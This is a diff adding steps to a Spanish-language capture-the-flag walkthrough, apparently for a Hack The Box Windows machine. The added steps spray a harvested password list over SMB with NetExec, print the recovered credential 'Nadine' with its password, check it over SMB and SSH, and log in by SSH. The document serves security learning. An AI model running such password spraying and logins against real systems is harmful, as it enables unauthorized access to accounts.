@@ -75,7 +75,31 @@ Obteniendo como respuesta el archivo de `/etc/hosts` de la maquina Windows
 También podemos apuntar al archivo de `Passwords.txt` que se encontraba en el directorio de *Nathan*, encontrando una lista de contraseñas
 ![[Pasted image 20260902215838.png]]
 
-Las cuales nos las copiaremos en un archivo de contraseñas, ahora validaremso cual contraseña es valida para que usuario usando [[NETEXEC]]
+Las cuales nos las copiaremos en un archivo de contraseñas, ahora validaremos cual contraseña es valida para que usuario usando [[NETEXEC]]
+```shell
+nxc smb 10.129.52.243 -u users -p passwords --continue-on-success
+```
+
+Encontrando la combinación de usuario y contraseña
+```ad-hint
+Nadine:L1k3B1gBut7s@W0rk
+```
+Validaremos que las credenciales son validas
+```shell
+nxc smb 10.129.52.243 -u Nadine -p L1k3B1gBut7s@W0rk
+```
+
+Y validaremos si nos sirven para acceder via *SSH*
+```shell
+nxc ssh 10.129.52.243 -u 'Nadine' -p 'L1k3B1gBut7s@W0rk'
+```
+
+Accederemos via *SSH*
+```shell
+ssh 10.129.52.243 -l 'Nadine'
+```
+
+
 
 
 
